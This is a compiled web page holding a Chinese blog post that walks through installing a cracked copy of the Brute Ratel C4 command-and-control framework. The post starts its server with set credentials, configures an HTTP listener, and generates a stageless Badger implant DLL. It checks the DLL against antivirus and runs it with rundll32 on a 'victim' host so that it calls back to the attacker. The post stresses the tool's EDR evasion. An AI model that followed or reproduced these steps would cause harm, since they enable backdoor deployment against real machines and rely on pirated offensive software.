import{_ as i,c as e,I as t,j as a,a as l,a4 as p,o as n,E as d}from"./chunks/framework.DOjH6-MY.js";const C=JSON.parse('{"title":"远控BRC4安装与简单上线","description":"","frontmatter":{"date":"2024-08-17T12:00:00.000Z"},"headers":[],"relativePath":"blog/远控BRC4安装与简单上线.md","filePath":"blog/远控BRC4安装与简单上线.md","lastUpdated":1725331162000}'),h={name:"blog/远控BRC4安装与简单上线.md"},c=a("h1",{id:"远控brc4安装与简单上线",tabindex:"-1"},[l("远控BRC4安装与简单上线 "),a("a",{class:"header-anchor",href:"#远控brc4安装与简单上线","aria-label":'Permalink to "远控BRC4安装与简单上线"'},"​")],-1),o=p(`<p>Brute Ratel C4是一款类似于Cobalt Strike的商业红队武器框架，每年License收费为3000美元，客户需要提供企业电子邮件地址并在颁发许可证之前进行验证，首个版本Brute Ratel C4 v0.2于2021年2月9日发布，它是由Mandiant和CrowdStrike的前红队队员Chetan Nayak创建的，该工具独特之处在于它专门设计防止端点检测和响应(EDR)和防病毒(AV)软件的检测，是一款新型的红队商业对抗性攻击模拟武器。</p><p>与Cobalt Strike的Beacon后门类似，Brute Ratel C4允许红队在远程终端主机上部署Badger后门程序，Badger连接回攻击者的命令和控制服务器，接收服务器端的命令执行相关的恶意行为。</p><p><a href="https://bruteratel.com/" target="_blank" rel="noreferrer">BRC4官网</a></p><p><img src="https://takuya-1305710862.cos.ap-shanghai.myqcloud.com/A1ways0nline/picCleanShot%202024-08-17%20at%2000.22.18@2x.png" alt="CleanShot 2024-08-17 at 00.22.18@2x.png" loading="lazy"></p><p>在kali中进行安装。首先对压缩包进行解压。</p><div class="vp-code-group vp-adaptive-theme"><div class="tabs"><input type="radio" name="group-VrvXD" id="tab-KuqqeRY" checked><label data-title="bash" for="tab-KuqqeRY">bash</label></div><div class="blocks"><div class="language-bash vp-adaptive-theme active line-numbers-mode"><button title="Copy Code" class="copy"></button><span class="lang">bash</span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">kali</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> ::</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> ~/Desktop/BRC4</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> »</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> unzip</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> BRC4.zip</span></span></code></pre><div class="line-numbers-wrapper" aria-hidden="true"><span class="line-number">1</span><br></div></div></div></div><p>得到如下文件：</p><p><img src="https://takuya-1305710862.cos.ap-shanghai.myqcloud.com/A1ways0nline/picCleanShot%202024-08-17%20at%2000.29.54@2x.png" alt="CleanShot 2024-08-17 at 00.29.54@2x.png" loading="lazy"></p><p>给予<code>brute-ratel-linx64_crack</code> 和 <code>lib64/commander</code> 执行权限</p><div class="vp-code-group vp-adaptive-theme"><div class="tabs"><input type="radio" name="group-VUdAU" id="tab-HB8bWiN" checked><label data-title="bash" for="tab-HB8bWiN">bash</label></div><div class="blocks"><div class="language-bash vp-adaptive-theme active line-numbers-mode"><button title="Copy Code" class="copy"></button><span class="lang">bash</span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">kali</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> ::</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> ~/Desktop/BRC4</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> »</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> chmod</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> +x</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> x</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> brute-ratel-linx64_crack</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">                                   1</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> ↵</span></span>
<span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">kali</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> ::</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> ~/Desktop/BRC4</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> »</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> chmod</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> +x</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> lib64/commander</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">                                            130</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> ↵</span></span></code></pre><div class="line-numbers-wrapper" aria-hidden="true"><span class="line-number">1</span><br><span class="line-number">2</span><br></div></div></div></div><p>启动服务端，其中用户名为<code>hack</code>，密码为<code>p@ssw0d</code>，端口为<code>7788</code>，可以自行调整。</p><div class="vp-code-group vp-adaptive-theme"><div class="tabs"><input type="radio" name="group-xkzLD" id="tab-t4B72lk" checked><label data-title="bash" for="tab-t4B72lk">bash</label></div><div class="blocks"><div class="language-bash vp-adaptive-theme active line-numbers-mode"><button title="Copy Code" class="copy"></button><span class="lang">bash</span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">kali</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> ::</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> ~/Desktop/BRC4</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> »</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> ../brute-ratel-linx64_crack</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -ratel</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -a</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> hack</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -p</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> p@ssw0d</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -h</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> 127.0.0.1:7788</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -sc</span></span>
<span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;"> cert.pem</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -sk</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> key.pem</span></span></code></pre><div class="line-numbers-wrapper" aria-hidden="true"><span class="line-number">1</span><br><span class="line-number">2</span><br></div></div></div></div><p><img src="https://takuya-1305710862.cos.ap-shanghai.myqcloud.com/A1ways0nline/picCleanShot%202024-08-17%20at%2000.32.05@2x.png" alt="CleanShot 2024-08-17 at 00.32.05@2x.png" loading="lazy"></p><p>接下来打开图形界面，首先赋予执行权限</p><div class="vp-code-group vp-adaptive-theme"><div class="tabs"><input type="radio" name="group-5ipT9" id="tab-iM8xMCS" checked><label data-title="bash" for="tab-iM8xMCS">bash</label></div><div class="blocks"><div class="language-bash vp-adaptive-theme active line-numbers-mode"><button title="Copy Code" class="copy"></button><span class="lang">bash</span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">kali</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> ::</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> ~/Desktop/BRC4</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> »</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> chmod</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> +x</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> Rungui.sh</span></span></code></pre><div class="line-numbers-wrapper" aria-hidden="true"><span class="line-number">1</span><br></div></div></div></div><p>启动图形界面</p><div class="vp-code-group vp-adaptive-theme"><div class="tabs"><input type="radio" name="group-sPunT" id="tab-6MnVR8p" checked><label data-title="bash" for="tab-6MnVR8p">bash</label></div><div class="blocks"><div class="language-bash vp-adaptive-theme active line-numbers-mode"><button title="Copy Code" class="copy"></button><span class="lang">bash</span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">kali</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> ::</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> ~/Desktop/BRC4</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> »</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> ./Rungui.sh</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">                                                    130</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> ↵</span></span></code></pre><div class="line-numbers-wrapper" aria-hidden="true"><span class="line-number">1</span><br></div></div></div></div><p>启动了图形界面后，接下来输入前面设定好的用户名和密码，点击猴子就可以成功登录。</p><p><img src="https://takuya-1305710862.cos.ap-shanghai.myqcloud.com/A1ways0nline/pic/image-20240817003911885.png" alt="image-20240817003911885" loading="lazy"></p><p><img src="https://takuya-1305710862.cos.ap-shanghai.myqcloud.com/A1ways0nline/pic/image-20240817004013352.png" alt="image-20240817004013352" loading="lazy"></p><p>进入客户端之后，点击<code>C4 Profiler</code>，然后点击<code>Add Http Listener</code>，这里和CS的步骤一样，需要先创建并配置一个监听器。</p><p><img src="https://takuya-1305710862.cos.ap-shanghai.myqcloud.com/A1ways0nline/pic/image-20240817004225691.png" alt="image-20240817004225691" loading="lazy"></p><p>接下来配置监听器，配置的内容为：</p><ol><li><code>Listener name</code>：监听器的名称，自定义。</li><li><code>Listener bind host</code>：设置监听地址，当前选择主机的 IP即可。</li><li><code>Rotational hosts</code>：重定向地址，当前点击右侧same按钮选择和监听器一样的地址。</li><li><code>Port</code>：端口自定义</li><li><code>Useragent</code>：默认即可。UA头</li><li><code>URI(S)</code>：瞎写就可以，随便。</li><li><code>OS</code>：默认</li><li><code>SSL</code>：选择<code>No</code>，如果选择<code>Yes</code>，可能会导致无法上线。</li><li><code>Sleep mask</code>：默认</li><li><code>Sleep</code>,<code>Jitter</code>：类似CS的延时时间，建议调低。</li><li><code>Create random set of authentication keys</code>,<code>Die if C2 is inaccessible?(Initialization only)</code>：勾选，马子如果不上线，不会一直请求。</li></ol><p><img src="https://takuya-1305710862.cos.ap-shanghai.myqcloud.com/A1ways0nline/pic/image-20240817004958076.png" alt="image-20240817004958076" loading="lazy"></p><p><img src="https://takuya-1305710862.cos.ap-shanghai.myqcloud.com/A1ways0nline/pic/image-20240817005241617.png" alt="image-20240817005241617" loading="lazy"></p><p>配置完成后，点击<code>Save</code>保存，即可创建一个监听器。</p><p>右键点击该监听器，选择<code>Stageless</code>，选择<code>x64 Arch (Default)</code>，选择<code>dll</code>，这里是根据前面创建监听器时设置的架构来选择的。即可生成对应架构的马。</p><p><img src="https://takuya-1305710862.cos.ap-shanghai.myqcloud.com/A1ways0nline/pic/image-20240817005459015.png" alt="image-20240817005459015" loading="lazy"></p><p><img src="https://takuya-1305710862.cos.ap-shanghai.myqcloud.com/A1ways0nline/pic/image-20240817005623775.png" alt="image-20240817005623775" loading="lazy"></p><p>对生成的DLL随手查杀一下</p><p><img src="https://takuya-1305710862.cos.ap-shanghai.myqcloud.com/A1ways0nline/pic/20240817010536.png" alt="image.png" loading="lazy"></p><p>将这个DLL放到受害者的主机上，为了方便测试，直接在cmd终端执行命令：</p><div class="vp-code-group vp-adaptive-theme"><div class="tabs"><input type="radio" name="group-f0iMx" id="tab-cpli5Xv" checked><label data-title="powershell" for="tab-cpli5Xv">powershell</label></div><div class="blocks"><div class="language-powershell vp-adaptive-theme active line-numbers-mode"><button title="Copy Code" class="copy"></button><span class="lang">powershell</span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">rundll32 badger_x64.dll</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">,</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">main</span></span></code></pre><div class="line-numbers-wrapper" aria-hidden="true"><span class="line-number">1</span><br></div></div></div></div><p>可以看到，成功上线了。</p><p><img src="https://takuya-1305710862.cos.ap-shanghai.myqcloud.com/A1ways0nline/pic/20240817011006.png" alt="image.png" loading="lazy"></p><p>更多后续使用方法再玩玩后分享。</p>`,37);function k(r,g,F,b,m,y){const s=d("ArticleMetadata");return n(),e("div",null,[c,t(s),o])}const v=i(h,[["render",k]]);export{C as __pageData,v as default};
